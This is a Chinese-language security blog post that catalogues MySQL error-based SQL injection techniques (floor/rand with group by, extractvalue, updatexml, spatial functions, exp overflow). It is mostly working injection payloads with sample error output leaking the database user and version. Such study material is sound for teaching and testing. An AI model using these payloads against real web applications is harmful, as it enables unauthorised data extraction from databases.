<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> MySQL Error Based SQL Injection （报错注入）总结 · Uknow’s Blog</title><meta name="description" content="MySQL Error Based SQL Injection （报错注入）总结 - uknow"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/2.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" type="text/css"></head><body><div id="mask" style="display: none;"><img id="mask-image" src="#" style=" "></div><div class="wrap"><header><a href="/" class="logo-link"><img src="/2.png"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">Blog</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">Archive</a></li><li class="nav-list-item"><a href="/about" target="_self" class="nav-list-link">About</a></li><li class="nav-list-item"><a href="http://weibo.com/u/3477219002" target="_blank" class="nav-list-link">Weibo</a></li><li class="nav-list-item"><a href="https://github.com/uknowsec" target="_blank" class="nav-list-link">GitHub</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">Rss</a></li></ul></header><section class="container"><div class="post"><article class="post-block"><h1 class="post-title">MySQL Error Based SQL Injection （报错注入）总结</h1><div class="post-time">Nov 17, 2017</div><div class="post-content"><h2 id="MySQL报错注入"><a href="#MySQL报错注入" class="headerlink" title="MySQL报错注入"></a>MySQL报错注入</h2><p>利用数据库报错来显示数据的注入方式经常会在入侵中利用到，这种方法有一点局限性，需要页面有错误回显。</p>
<p>数据类型转换报错是最常见的一种方法，在微软SQL Server上，利用的是convert()和cast()函数，MySQL的报错SQL注入方式更多。</p>
<p>有很多函数都会导致MySQL报错并且显示出数据，它们分别是</p>
<ul>
<li>GemetryCollection()</li>
<li>polygon(),GTID_SUBSET()</li>
<li>multipoint()</li>
<li>multinestring()</li>
<li>multipolygon()</li>
<li>LINESTRING()</li>
<li>exp()</li>
</ul>
<p>MYSQL报错注入大体可以分为以下几类：</p>
<ul>
<li>BIGINT等数据类型溢出</li>
<li>xpath语法错误</li>
<li>concat+rand()+group_by()导致主键重复</li>
<li>空间数据类型函数错误</li>
</ul>
<h2 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h2><h3 id="注入语句"><a href="#注入语句" class="headerlink" title="注入语句"></a>注入语句</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br></pre></td></tr></table></figure>
<ul>
<li>floor：函数只返回整数部分，小数部分舍弃。</li>
<li>round：函数四舍五入，大于0.5的部分进位，不到则舍弃。</li>
</ul>
<h3 id="报错注入原理"><a href="#报错注入原理" class="headerlink" title="报错注入原理"></a>报错注入原理</h3><p>目前比较常见的几种报错注入的方法都是利用了mysql某些不能称为bug的bug来实现的。</p>
<p>下面就以 rand() 函数来进行说明。mysql的官方文档中对 rand() 函数有特殊的说明：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">RAND() in a WHERE clause is re-evaluated every time the WHERE is executed. You cannot use a column with RAND() values in an ORDER BY clause, because ORDER BY would evaluate the column multiple times. However, you can retrieve rows in random order like this:</span><br></pre></td></tr></table></figure>
<p>官方文档中的意思是：在where语句中，where每执行一次，rand()函数就会被计算一次。rand()不能作为order by的条件字段，同理也不能作为group by的条件字段。</p>
<p>因此在mysql中，可以构造一个值不确定而有可重复的字段作为group by的条件字段，这是就可以报出类似于Duplicate entry ‘…’ for key ‘group_key’的错误</p>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from admin where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line"></span><br><span class="line">1062 - Duplicate entry &apos;root@localhost1&apos; for key &apos;group_key&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select * from admin where id=1 and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line"></span><br><span class="line">1062 - Duplicate entry &apos;5.5.531&apos; for key &apos;group_key&apos;</span><br></pre></td></tr></table></figure>
<h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h2><p>MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数，分别是ExtractValue()和UpdateXML()</p>
<p>因此在mysql 小于5.1.5中不能用ExtractValue和UpdateXML进行报错注入。</p>
<h3 id="注入语句-1"><a href="#注入语句-1" class="headerlink" title="注入语句"></a>注入语句</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br></pre></td></tr></table></figure>
<h3 id="报错注入原理-1"><a href="#报错注入原理-1" class="headerlink" title="报错注入原理"></a>报错注入原理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXTRACTVALUE (XML_document, XPath_string);</span><br></pre></td></tr></table></figure>
<ul>
<li>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc </li>
<li>第二个参数：XPath_string (Xpath格式的字符串). </li>
<li>作用：从目标XML中返回包含所查询值的字符串</li>
</ul>
<p>第二个参数都要求是符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里</p>
<h3 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from admin where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br><span class="line">1105 - XPATH syntax error: &apos;~root@localhost~&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select * from admin where id=1 and (extractvalue(1,concat(0x7e,(select version()),0x7e)));</span><br><span class="line">1105 - XPATH syntax error: &apos;~5.5.53~&apos;</span><br></pre></td></tr></table></figure>
<h2 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h2><p>MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数，分别是ExtractValue()和UpdateXML()</p>
<p>因此在mysql 小于5.1.5中不能用ExtractValue和UpdateXML进行报错注入。</p>
<h3 id="注入语句-2"><a href="#注入语句-2" class="headerlink" title="注入语句"></a>注入语句</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br></pre></td></tr></table></figure>
<h3 id="报错注入原理-2"><a href="#报错注入原理-2" class="headerlink" title="报错注入原理"></a>报错注入原理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATEXML (XML_document, XPath_string, new_value);</span><br></pre></td></tr></table></figure>
<ul>
<li>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc </li>
<li>第二个参数：XPath_string (Xpath格式的字符串)</li>
<li>第三个参数：new_value，String格式，替换查找到的符合条件的数据 </li>
<li>作用：改变文档中符合条件的节点的值</li>
</ul>
<p>返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL。</p>
<p>通过查询@@version,返回版本。然后CONCAT将其字符串化。因为UPDATEXML第二个参数需要Xpath格式的字符串,所以不符合要求，然后报错。</p>
<h3 id="测试-2"><a href="#测试-2" class="headerlink" title="测试"></a>测试</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from admin where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br><span class="line">1105 - XPATH syntax error: &apos;~root@localhost~&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select * from admin where id=1 and (updatexml(1,concat(0x7e,(select version()),0x7e),1));</span><br><span class="line">1105 - XPATH syntax error: &apos;~5.5.53~&apos;</span><br></pre></td></tr></table></figure>
<h2 id="GemetryCollection-multipoint-polygon-multipolygon-linestring-multilinestring"><a href="#GemetryCollection-multipoint-polygon-multipolygon-linestring-multilinestring" class="headerlink" title="GemetryCollection() multipoint() polygon() multipolygon() linestring() multilinestring()"></a>GemetryCollection() multipoint() polygon() multipolygon() linestring() multilinestring()</h2><p>以上函数均为MySQL中的空间数据类型（存储）的函数</p>
<p>目前仅在MyISAM数据引擎下提供空间索引支持,要求几何字段非空</p>
<h3 id="注入语句-3"><a href="#注入语句-3" class="headerlink" title="注入语句"></a>注入语句</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">select * from products where pid=1 and geometrycollection((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">select * from products where pid=1 and multipoint((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">select * from products where pid=1 and polygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">select * from products where pid=1 and multipolygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">select * from products where pid=1 and linestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">select * from products where pid=1 and multilinestring((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
<h3 id="测试-3"><a href="#测试-3" class="headerlink" title="测试"></a>测试</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from products where pid=1 and geometrycollection((select * from(select * from(select user())a)b));</span><br><span class="line">1367 - Illegal non geometric &apos;(select `b`.`user()` from (select &apos;root@localhost&apos; AS `user()` from dual) `b`)&apos; value found during parsing</span><br><span class="line">mysql&gt; select * from products where pid=1 and geometrycollection((select * from(select * from(select version())a)b));</span><br><span class="line">1367 - Illegal non geometric &apos;(select `b`.`version()` from (select &apos;5.5.48&apos; AS `version()` from dual) `b`)&apos; value found during parsing</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from products where pid=1 and multipoint((select * from(select * from(select user())a)b));</span><br><span class="line">1367 - Illegal non geometric &apos;(select `b`.`user()` from (select &apos;root@localhost&apos; AS `user()` from dual) `b`)&apos; value found during parsing</span><br><span class="line">mysql&gt; select * from products where pid=1 and multipoint((select * from(select * from(select version())a)b));</span><br><span class="line">1367 - Illegal non geometric &apos;(select `b`.`version()` from (select &apos;5.5.48&apos; AS `version()` from dual) `b`)&apos; value found during parsing</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from products where pid=1 and polygon((select * from(select * from(select user())a)b));</span><br><span class="line">1367 - Illegal non geometric &apos;(select `b`.`user()` from (select &apos;root@localhost&apos; AS `user()` from dual) `b`)&apos; value found during parsing</span><br><span class="line">mysql&gt; select * from products where pid=1 and polygon((select * from(select * from(select version())a)b));</span><br><span class="line">1367 - Illegal non geometric &apos;(select `b`.`version()` from (select &apos;5.5.48&apos; AS `version()` from dual) `b`)&apos; value found during parsing</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from products where pid=1 and multipolygon((select * from(select * from(select user())a)b));</span><br><span class="line">1367 - Illegal non geometric &apos;(select `b`.`user()` from (select &apos;root@localhost&apos; AS `user()` from dual) `b`)&apos; value found during parsing</span><br><span class="line">mysql&gt; select * from products where pid=1 and multipolygon((select * from(select * from(select version())a)b));</span><br><span class="line">1367 - Illegal non geometric &apos;(select `b`.`version()` from (select &apos;5.5.48&apos; AS `version()` from dual) `b`)&apos; value found during parsing</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from products where pid=1 and linestring((select * from(select * from(select user())a)b));</span><br><span class="line">1367 - Illegal non geometric &apos;(select `b`.`user()` from (select &apos;root@localhost&apos; AS `user()` from dual) `b`)&apos; value found during parsing</span><br><span class="line">mysql&gt; select * from products where pid=1 and linestring((select * from(select * from(select version())a)b));</span><br><span class="line">1367 - Illegal non geometric &apos;(select `b`.`version()` from (select &apos;5.5.48&apos; AS `version()` from dual) `b`)&apos; value found during parsing</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from products where pid=1 and multilinestring((select * from(select * from(select user())a)b));</span><br><span class="line">1367 - Illegal non geometric &apos;(select `b`.`user()` from (select &apos;root@localhost&apos; AS `user()` from dual) `b`)&apos; value found during parsing</span><br><span class="line">mysql&gt; select * from products where pid=1 and multilinestring((select * from(select * from(select version())a)b));</span><br><span class="line">1367 - Illegal non geometric &apos;(select `b`.`version()` from (select &apos;5.5.48&apos; AS `version()` from dual) `b`)&apos; value found during parsing</span><br></pre></td></tr></table></figure>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h2><p>在mysql5.5之前，整形溢出是不会报错的，根据官方文档说明out-of-range-and-overflow，只有版本号大于5.5.5时，才会报错。</p>
<p>利用exp函数也产生类似的溢出错误</p>
<h3 id="注入语句-4"><a href="#注入语句-4" class="headerlink" title="注入语句"></a>注入语句</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from products where pid=1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure>
<h3 id="测试-4"><a href="#测试-4" class="headerlink" title="测试"></a>测试</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from products where pid=1 and exp(~(select * from(select user())a));</span><br><span class="line">1690 - DOUBLE value is out of range in &apos;exp(~((select &apos;root@localhost&apos; from dual)))&apos;</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from admin where id=1 and exp(~(select * from(select version())a));</span><br><span class="line">1690 - DOUBLE value is out of range in &apos;exp(~((select `a`.`version()` from (select version() AS `version()`) `a`)))&apos;</span><br></pre></td></tr></table></figure>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://wooyun.jozxing.cc/static/drops/tips-14312.html" target="_blank" rel="noopener">Mysql报错注入原理分析(count()、rand()、group by)</a><br><a href="https://n0tr00t.com/2014/11/16/error-based-sql-injection.html" target="_blank" rel="noopener">Error Based SQL Injection</a><br><a href="https://edu.aqniu.com/article/54" target="_blank" rel="noopener">MYSQL报错注入的一点总结</a><br><a href="https://www.cnblogs.com/MiWhite/p/6228491.html" target="_blank" rel="noopener">UpdateXml() MYSQL显错注入</a><br><a href="http://www.cnseay.com/4239/" target="_blank" rel="noopener">《代码审计：企业级Web代码安全架构》</a></p>
</div></article></div></section><footer><div class="paginator"><a href="/posts/ctf/week-1-for-cnas-writeup.html" class="prev">PREV</a><a href="/posts/notes/php支持的协议和封装协议小结.html" class="next">NEXT</a></div><div class="copyright"><p>© 2016 - 2018 <a href="http://uknowsec.cn">uknow</a>, Powered by Hexo & Hexo-theme-apollo.</p></div></footer></div><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-65933410-1",'auto');ga('send','pageview');</script><script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "225ebcce29d319519ac7c7690425d1d4";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script></body></html>